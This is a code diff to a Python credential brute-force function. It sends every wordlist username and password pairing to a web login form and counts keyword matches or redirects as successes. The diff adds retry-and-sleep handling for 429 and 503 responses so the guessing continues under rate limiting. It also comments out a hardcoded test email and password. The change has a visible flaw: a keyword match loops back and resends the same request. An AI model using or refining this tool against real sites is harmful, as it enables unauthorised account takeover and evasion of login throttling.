@@ -7,6 +7,8 @@ from utils.constants import SUCCESS_KEYWORDS
 
 from utils.link_utils import verify_success_resp
 
+import time
+
 Credential = namedtuple('Credential', ["user", "password"])
 
 def bruteforce(request, url, host, port, agent, 
@@ -54,33 +56,42 @@ def bruteforce(request, url, host, port, agent,
     
     # Try all combinations for the form described by url on host
     content_type = HTTP_CONTENTTYPE_FORMENCODED
+    sleep_time = 30
     for user in all_words:
         for _pass in all_words:
-            request.connect()
             data = {user_key: user, pass_key: _pass}
             body = request.generate_post_body(content_type,data)
             content_length = len(body)
-            successful = request.send_post_request(url, host, agent, content_type, content_length, body)
+            too_many_req = True
+            while too_many_req:
+                request.connect()
+                successful = request.send_post_request(url, host, agent, content_type, content_length, body)
 
-            if successful:
-                response = request.receive()
-                print(f'User: {user}, Pass: {_pass}')
-                if user == "bawofafefe@kulmeo.com" and _pass == "Test12345!":
-                    print('Should be successful')
-                
-                # See if the response contained any words that indicate the login was successful.
-                if verify_success_resp(response):
-                    success.append(Credential(user,_pass))
-                    continue
-
-                # Check if the response was a redirect to a different page.
-                # print(response)
-                _tuple = HttpRequest.get_status_code(response)
-                if _tuple is not None:
-                    status_code, __ = _tuple
-                    if status_code[:1] == "3":
+                if successful:
+                    response = request.receive()
+                    # print(f'User: {user}, Pass: {_pass}')
+                    # if user == "bawofafefe@kulmeo.com" and _pass == "Test12345!":
+                    #     print('Should be successful')
+                    
+                    # See if the response contained any words that indicate the login was successful.
+                    if verify_success_resp(response):
                         success.append(Credential(user,_pass))
                         continue
-                
-            request.close()
+
+                    # Check the status code
+                    _tuple = HttpRequest.get_status_code(response)
+                    if _tuple is not None:
+                        status_code, __ = _tuple
+                        if status_code == "429" or status_code == "503":
+                            time.sleep(sleep_time)
+                        else:
+                            too_many_req = False
+                        # If we are redirected, assume login was successful.
+                        if status_code[:1] == "3":
+                            success.append(Credential(user,_pass))
+                            print(f'User: {user}, Pass: {_pass} -- SUCCESS.')
+                            continue
+                else:
+                    too_many_req = False
+                request.close()
     return success
